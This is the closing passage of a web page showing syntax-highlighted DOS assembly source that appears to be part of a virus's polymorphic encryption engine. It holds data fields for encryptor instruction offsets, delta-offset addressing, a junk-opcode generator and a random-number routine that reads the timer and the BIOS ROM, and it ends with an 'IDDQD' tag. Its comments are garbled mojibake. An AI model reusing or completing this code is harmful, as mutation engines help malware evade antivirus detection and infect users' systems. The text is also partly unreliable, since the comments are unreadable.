</span><span class="sc5">D_lng1</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; ¬¥é¥­¨¥ ­  Mov ??,???? = 2</span><span class="sc0">
</span><span class="sc5">D_lng2</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; ¬¥é¥­¨¥ ­  Cmp ??,????</span><span class="sc0">
</span><span class="sc5">D_last</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; ¬¥é¥­¨¥ ­  ¯®á«¥¤­¨© ¡ ©â CRYPT' </span><span class="sc0">
</span><span class="sc5">D_lng4</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; OFFSET Jb yy</span><span class="sc0">
</span><span class="sc5">Count</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_Cmp</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">081h</span><span class="sc0">
</span><span class="sc5">_c</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">m1</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">m2</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ni1</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ni2</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;ni3            db      0</span><span class="sc0">
</span><span class="sc1">;ni4            db      0</span><span class="sc0">
</span><span class="sc5">Com_buf</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Data</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Cm_off</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">Set_op</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Es</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cs</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Es</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Si</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">cm_off</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_c</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Es</span><span class="sc0">
        </span><span class="sc6">Ret</span><span class="sc0">

</span><span class="sc5">Gen_gar</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">
</span><span class="sc5">gar</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Get_rnd</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">000fh</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Get_off</span><span class="sc0">
        </span><span class="sc6">Or</span><span class="sc0">      </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Jz</span><span class="sc0">      </span><span class="sc5">gar</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">D0lng</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">  </span><span class="sc1">; «¨­­  2</span><span class="sc0">
</span><span class="sc5">ag2</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Get_rnd</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">0025</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Get_off</span><span class="sc0">
        </span><span class="sc6">Lea</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,[</span><span class="sc8">Di</span><span class="sc4">]+</span><span class="sc5">one_b_op</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">LodSb</span><span class="sc0">
        </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ni1</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Je</span><span class="sc0">      </span><span class="sc5">ag2</span><span class="sc0">
        </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">ni2</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Je</span><span class="sc0">      </span><span class="sc5">ag2</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">
        </span><span class="sc6">Cld</span><span class="sc0">
        </span><span class="sc6">StoSb</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Loop</span><span class="sc0">    </span><span class="sc5">ag2</span><span class="sc0">     </span><span class="sc1">;Gen_com1</span><span class="sc0">
        </span><span class="sc6">Ret</span><span class="sc0">

</span><span class="sc5">Get_off</span><span class="sc4">:</span><span class="sc0">        
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ax</span><span class="sc0">                      </span><span class="sc1">; di - result</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Bx</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cx</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Dx</span><span class="sc0">
        </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Bx</span><span class="sc0">
        </span><span class="sc6">Xor</span><span class="sc0">     </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Bx</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">65535</span><span class="sc0">
</span><span class="sc5">der</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Bh</span><span class="sc4">,</span><span class="sc8">Ah</span><span class="sc0">  </span><span class="sc1">;start of space</span><span class="sc0">
</span><span class="sc5">cyc</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ser</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">Bh</span><span class="sc0">
        </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Bh</span><span class="sc4">,</span><span class="sc8">Al</span><span class="sc0">  </span><span class="sc1">;end of space</span><span class="sc0">
        </span><span class="sc6">Jnz</span><span class="sc0">     </span><span class="sc5">cyc</span><span class="sc0">
        </span><span class="sc6">Loop</span><span class="sc0">    </span><span class="sc5">der</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">_ok</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">Xor</span><span class="sc0">     </span><span class="sc8">Bl</span><span class="sc4">,</span><span class="sc8">Bl</span><span class="sc0">
        </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Bh</span><span class="sc4">,</span><span class="sc8">Bl</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Bx</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc0">
        </span><span class="sc6">Cld</span><span class="sc0">
        </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">ser</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">Inc</span><span class="sc0"> </span><span class="sc8">Bl</span><span class="sc0">
        </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Bl</span><span class="sc4">,</span><span class="sc8">Dl</span><span class="sc0">
        </span><span class="sc6">Jz</span><span class="sc0"> </span><span class="sc5">fc</span><span class="sc0">
        </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">fc</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc0">
        </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">_ok</span><span class="sc0">

</span><span class="sc5">Get_rnd</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Ax</span><span class="sc0">              </span><span class="sc1">; bx - random number</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Dx</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Es</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cx</span><span class="sc0">
        </span><span class="sc6">In</span><span class="sc0">      </span><span class="sc8">Ax</span><span class="sc4">,[</span><span class="sc2">40h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">Count</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">0f800h</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Es</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">Data</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Xor</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc4">:[</span><span class="sc8">Di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">Data</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">Count</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">203d</span><span class="sc0">
        </span><span class="sc6">Rol</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Cl</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Di</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Es</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc0">
        </span><span class="sc6">Cld</span><span class="sc0">
        </span><span class="sc6">Ret</span><span class="sc0">

</span><span class="sc1">;##############################################################################</span><span class="sc0">

</span><span class="sc5">Buffer</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Lng_II</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">dat</span><span class="sc0">
</span><span class="sc5">sc</span><span class="sc0">      </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc5">ID</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">''</span><span class="sc0">
</span><span class="sc5">Lng</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">Sc</span><span class="sc0">
</span><span class="sc5">mem</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc4">(</span><span class="sc5">Lng</span><span class="sc4">/</span><span class="sc2">16d</span><span class="sc4">)+</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span><span class="sc9">END</span><span class="sc0">

</span><span class="sc1">; IDDQD</span></div></body>
</html>
